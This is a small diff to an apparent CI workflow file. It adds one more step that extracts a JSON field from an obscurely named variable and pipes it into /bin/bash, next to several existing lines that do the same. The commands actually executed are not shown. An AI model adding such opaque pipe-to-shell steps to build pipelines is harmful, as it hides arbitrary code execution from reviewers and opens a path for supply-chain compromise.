@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$whw88" | jq -r .ff09 | /bin/bash
           echo $qp879 | jq -r .zs3 | /bin/bash
           printf '%s' "$wli87856" | jq -r .m3616 | /bin/bash
+          echo $vwl11701 | jq -r .gps4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
